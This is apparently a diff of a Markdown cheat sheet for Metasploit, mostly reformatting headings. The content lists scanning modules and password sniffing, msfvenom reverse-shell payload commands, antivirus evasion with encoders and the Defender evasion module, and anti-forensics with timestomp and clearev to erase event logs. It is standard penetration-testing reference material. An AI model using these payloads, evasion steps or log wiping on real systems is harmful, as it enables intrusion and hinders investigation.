@@ -1,51 +1,52 @@
 # Metasploit
 ---
 ## Navigation
-- **[Basic commands](#Basic%20commands)**
-- **[Information gathering](#Information%20gathering)**
-	- [Port scanning](#Port%20scanning)
-	- [Backup files from websites](#Backup%20files%20from%20websites)
-	- [Directory listing test](#Directory%20listing%20test)
-	- [SSL testing](#SSL%20testing)
-	- [SSH kippo detection](#SSH%20kippo%20detection)
-	- [Domain Name System](#Domain%20Name%20System)
-	- [Remote Desktop protocol](#Remote%20Desktop%20protocol)
-	- [Password Sniffing](#Password%20Sniffing)
-	- [Shodan qeuries](#Shodan%20qeuries) 
-- **[Vulnerability Hunting](#Vulnerability%20Hunting)**
-	- [Managing the database](#Managing%20the%20database) 
-	- [Importing scans](#Importing%20scans)
-	- [Backing up the database](#Backing%20up%20the%20database)
-	- [Nmap with metasploit](#Nmap%20with%20metasploit)
+- [**Basic Commands**](#Basic-Commands)
+- [**Commands from a file**](#Commands-from-a-file)
+- [**Information Gathering**](#Information-Gathering)
+	- [Port Scanning](#Port-scanning)
+	- [Backup files from websites](#Backup-files-from-websites)
+	- [Directory listing test](#Directory-listing-test)
+	- [SSL testing](#SSL-testing)
+	- [SSH kippo detection](#SSH-kippo-detection)
+	- [Domain Name System](#Domain-Name-System)
+	- [Remote Desktop protocol](#Remote-Desktop-protocol)
+	- [Password Sniffing](#Password-Sniffing)
+	- [Shodan qeuries](#Shodan-qeuries) 
+- **[Vulnerability Hunting](#Vulnerability-Hunting)**
+	- [Managing the database](#Managing-the-database) 
+	- [Importing scans](#Importing-scans)
+	- [Backing up the database](#Backing-up-the-database)
+	- [NMAP](#NMAP)
 	- [Nessus](#Nessus)
-	- [msf utilities](#msf%20utilities)
-- **[Client-Side attacks](#Client-Side%20attacks)** 
+	- [msf utilities](#msf-utilities)
+- **[Client-Side attacks](#Client-Side-attacks)** 
 	- [Msfvenom](#Msfvenom)
 	- [Listeners](#Listeners) 
-- **[Antivirus Evasion and Anti-Forensics](#Antivirus%20Evasion%20and%20Anti-Forensics)**
-	- **[Using encoders](#Using%20encoders)**
-		- [shikata_ga_nai encoder](#shikata_ga_nai%20encoder)
-		- [opt_sub encoder](#opt_sub%20encoder)
-	- **[Using the new evasion modules](#Using%20the%20new%20evasion%20modules)**
+- **[Antivirus Evasion and Anti-Forensics](#Antivirus-Evasion-and-Anti-Forensics)**
+	- **[Using encoders](#Using-encoders)**
+		- [shikata_ga_nai encoder](#shikata_ga_nai-encoder)
+		- [opt_sub encoder](#opt_sub-encoder)
+	- **[Using the new evasion modules](#Using-the-new-evasion-modules)**
 		- [windows_defender_exe](#windows_defender_exe)
-	- **[Using packagers and encrypters](#Using%20packagers%20and%20encrypters)**
-		- [Using 7-zip utility](#Using%207-zip%20utility) 
-	- **[Understanding what a sandbox is](#Understanding%20what%20a%20sandbox%20is)**
-		- [Using Metasploit for anti-forensics](#Using%20Metasploit%20for%20anti-forensics)
+	- **[Using packagers and encrypters](#Using-packagers-and-encrypters)**
+		- [Using 7-zip utility](#Using-7-zip-utility) 
+	- **[Understanding what a sandbox is](#Understanding-what-a-sandbox-is)**
+		- [Using Metasploit for anti-forensics](#Using-Metasploit-for-anti-forensics)
 			- [Timestomp](#Timestomp)
 			- [Clearev](#Clearev)
 - **[Armitage](#Armitage)** 
-	- [Scanning and enumeration](#Scanning%20and%20enumeration)
-	- [Finding and launching attacks](#Finding%20and%20launching%20attacks)
-- **[Importing scans](#Importing%20scans)** 
+	- [Scanning and enumeration](#Scanning-and-enumeration)
+	- [Finding and launching attacks](#Finding-and-launching-attacks)
+- **[Importing scans](#Importing-scans)** 
 - **[Pivoting](#Pivoting)**
-	- [Adding a route](#Adding%20a%20route)
+	- [Adding a route](#Adding-a-route)
 	- [Metasploit](#Metasploit)
 - **[Post-exploitation](#Post-exploitation)**
 - **[Powershell](#Powershell)**
-- **[Further learning](#Further%20learning)**
+- **[Further learning](#Further-learning)**
 ---
-# Basic commands
+# Basic-Commands
  - **Version**: Display version.
  - **Connect <IP:PORT>**: Works like Netcat.
  - **Help**: Display help :).
@@ -63,58 +64,69 @@
  - **Set**&**unset**: For setting and unsetting variables.
  - **Setg**&**unsetg**: For setting and unsetting global variables.
 
-# Information gathering
-## Port scanning
+# Commands-from-a-file
+Put the commands in a file
+```
+use <MODULE>
+set lhost
+set rhosts
+```
+Then
+```
+msfconsole -r <FILE>
+```
+# Information-Gathering
+## Port-scanning
 ```txt
 auxiliary/scanner/portscan/tcp
 auxiliary/scanner/discovery/udp_sweep
 ```
-## Backup files from websites
+## Backup-files-from-websites
 Sometimes, developers and application administrators forget to remove backup files from the web server
 ```txt
 auxiliary/scanner/http/backup_file
 ```
-## Directory listing test
+## Directory-listing-test
 Quite often, the web server is misconfigured to display the list of files contained in the root directory.
 ```txt
 auxiliary/scanner/http/dir_listing
 ```
-## SSL testing
+## SSL-testing
 Tests for weak cryptography and misconfigurations.
 ```txt
 auxiliary/scanner/http/ssl
 ```
-Tests for heartbleed vuln.
+Tests for Heartbleed vuln.
 ```txt
 auxiliary/scanner/ssl/openssl_heartbleeds
 ```
 
-## SSH kippo detection
+## SSH-kippo-detection
 Kippo is an SSH-based honeypot that is specially designed to lure and trap potential attackers.
 ```txt
 auxiliary/scanner/ssh/detect_kippo
 ```
-## Domain Name System
+## Domain-Name-System
 ```txt
 auxiliary/gather/dns_info
 ```
-## Remote Desktop protocol
+## Remote-Desktop-protocol
 Test for `MS12-020` vulnerability.
 ```txt
 auxiliary/scanner/rdp/ms12_020
 ```
-## Password Sniffing
+## Password-Sniffing
 iT listens on the network interface and looks for passwords sent over various protocols, such as `FTP`, `IMAP`,`POP3`, and `SMB`.
 ```txt
 auxiliary/sniffer/psnuffle
 ```
-## Shodan qeuries
+## Shodan-queries
 ```txt
 auxiliary/gather/shodan_search
 ```
 ---
-# Vulnerability Hunting
-## Managing the database
+# Vulnerability-Hunting
+## Managing-the-database
 ```bash
 service postgresql start
 ```
@@ -123,13 +135,13 @@ Initiate the PostgreSQL database service
 msfdbinit
 db_status
 ```
-## Managing workspaces
+## Managing-Workspaces
 - **Workspace:** Lists all previously created workspaces.
 - **Workspace -h :** This lists help for Workspace.
 - **Workspace -a \<NAME\>:** This creates anew workspace.
 - **Workspace -d \<NAME\>:** This deletes workspace.
 - **Workspace \<NAME\>:** This switches to the specified workspace.
-## Importing scans
+## Importing-Scans
 Importing scans.
 ```bash
 db_import <PathToFile>
@@ -146,17 +158,17 @@ Lists the services from an imported file and the DB.
 services
 services -h
 ```
-## Backing up the database
+## Backing-up-the-database
 Exports all data within the database to an external XML file.
 ```bash
 db_export -f xml <PathToSave>
 ```
- ## Nmap with metasploit
+### NMAP
  ```bash
  #All default nmap options work here
  db_nmap 
  ```
- ## Nessus
+### Nessus
  - Perform a Nessus scan on the target system, save the report, and then import it  `db_import`.
  - Load, initiate, and trigger a Nessus scan on the target system directly through msfconsole.
 ```bash
@@ -171,7 +183,7 @@ nessus_scan_launch <Scan ID>
 #Get the report after it finishes
 nessus_report_vulns <Scan ID>
 ```
-## msf utilities
+## MSF-Utilities
 Path  to the tools -> `/usr/share/metasploit-framework/tools`
 - **msf-exe2vbs:** Convert an executable payload into `VBScript format`.
 - **msf-exe2vba:** Convert an executable payload into `VBA format`.
@@ -194,7 +206,7 @@ msf-makeiplist -i <FILE>
 etc..
 ```
 ---
-# Client-Side attacks
+# Client-Side-attacks
 - The attacker hosts a website with the required malicious payload and sends it to the victim.
 - The attacker sends the payload embedded in any innocent-looking file, such as a DOC, PDF, or XLS, to the victim over email.
 - The attacker sends the payload using an infected media drive (such as a USB flash drive, CD, or DVD).
@@ -231,8 +243,8 @@ meterpreter/reverse_tcp; set LHOST <IP>; set LPORT
 <PORT>; run; exit -y"
 ```
 ---
-# Antivirus Evasion and Anti-Forensics
-## Using encoders
+# Antivirus-Evasion-Anti-Forensics
+## Using-Encoders
 ### shikata_ga_nai encoder
 This is not the best way to evade a modern AV because it's easilty detected even after multiple encoding iterations. 
 ```bash
@@ -240,12 +252,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 # -i ,iterations
 ```
-### opt_sub encoder
+### opt_sub-encoder
 This is slightly better than shikata_ga_nai but overall not the best option for a real-life engagement.
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -e x86/opt_sub -i 5 -f exe -O ./reverse.exe
 ```
-## Using the new evasion modules
+## Using-the-new-evasion-modules
 This module evades the Windows Defender antivirus. This is achieved using various techniques, such as metasm, anti-emulation, shellcode encryption, and source code obfuscation.
 ### windows_defender_exe
 ```bash
@@ -254,8 +266,8 @@ use evasion/windows/windows_defender_exe
 Further reading ->  https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ 
 >There are more evasion modules that can be found by typing `search eavsion` in msfconsole.
 
-## Using packagers and encrypters
-### Using 7-zip utility
+## Using-packagers-and-encrypters
+### Using-7-zip-utility
 Create a pdf payload with the following module for demonstration
 ```bash
 use exploit/windows/fileformat/adobe_utilprintf
@@ -264,7 +276,7 @@ Then use 7-zip utility to encrypt the pdf.
 
 ![[7zip.png]]
 
-## Understanding what a sandbox is
+## Understanding-what-a-sandbox-is
 Whenever we execute an application, be it legitimate or malicious, some of the events that occur are as follows:
 - The application directly interacts with the host operating system.
 - System calls are made.
@@ -276,9 +288,9 @@ Whenever we execute an application, be it legitimate or malicious, some of the e
 - Configuration files are updated.
 
 Imagine that a sandbox is an isolated container or compartment. Anything that is executed within a sandbox stays within it and does not impact the outside world. Running a payload sample within a sandbox will help you analyze its behavior without impacting the host operating system.
-### Using Metasploit for anti-forensics
+### Using-Metasploit-for-anti-forensics
 **Meterpreter** works using an in-memory dll injection and ensures that nothing is written onto the disk unless explicitly required. However, during a compromise, we often need to perform certain actions that modify, add, or delete files on the remote file system.
-This implies that our actions will be traced back if any sort of forensic investigation is undertaken on the compromised system.Fortunately, the Metasploit Framework offers tools and utilities that help us clear our tracks and ensure that little or no evidence of our compromise is left on the system.
+This implies that our actions will be traced back if any sort of forensic investigation is undertaken on the compromised system. Fortunately, the Metasploit Framework offers tools and utilities that help us clear our tracks and ensure that little or no evidence of our compromise is left on the system.
 #### Timestomp
 Every file on the system have Meta-data that include the creation date,last modified,time stamps etc..,So when we compromise a system and get a Meterpreter shell on it, we might be required to access existing files on this system, create new files, or modify existing files.When we make such changes, it will obviously reflect in the metadata in the form of changed timestamps. This could certainly raise an alarm or give away a lead during an incident investigation.
 We can use `timestomp` command to change the timestamp of a certian file.
@@ -286,7 +298,7 @@ We can use `timestomp` command to change the timestamp of a certian file.
 #In a meterpreter shell
 timestomp <FILE> -c "01/01/2021 6:30:25"
 ```
-#### Clearev
+#### Clearenv
 Whenever we interact with a Windows system, all the actions get recorded in the form of event logs. The event logs are classified into three categories:
 - Application logs: Contains application events, such as startup, and shutdown.
 - Security logs: Contains security events, such as login failures.
@@ -299,7 +311,7 @@ clearev
 ```
 ---
 # Armitage
-To start armitage:
+To start Armitage:
 ```bash
 #Start postgresql
 sudo Service postgresql start
@@ -316,7 +328,7 @@ Add a host to attack
 3. You can add multiple hosts per line.
 
 ![[armitage.png]]
-## Scanning and enumeration
+## Scanning-and-enumeration
 Right-click on the host and select the Scan
 option.
 
@@ -327,7 +339,7 @@ option.
 2. Select the nmap scan.
 3. Select the Quick Scan (OS Detect) option.
 
-## Finding and launching attacks
+## Finding-and-launching-attacks
 1. Select the Attacks menu.
 2. Click on Find Attacks.
 3. Now, the Armitage console will query the backend database for all the possible matching exploits against the open ports that we found during our enumeration earlier.
@@ -336,7 +348,7 @@ option.
  - http://www.fastandeasyhacking.com/
 
 ---
-# Importing external exploits
+# Importing-external-exploits
 1. Download the exploit.rb code.
 2. Put it in the appropriate path `/usr/share/metasploit-framework/modules/PATH`
 > Important Note
@@ -355,7 +367,7 @@ route add <IP> <SubnetMask> <SessionNumber>
 #Example
 route add 10.10.10.15 255.255.255.0 1
 ```
-## Metasploit with Proxychains
+## Metasploit-withProxychains
 1. Change default `SRVPORT` to match Proxychains
 ```bash
 use auxiliary/server/socks_proxy
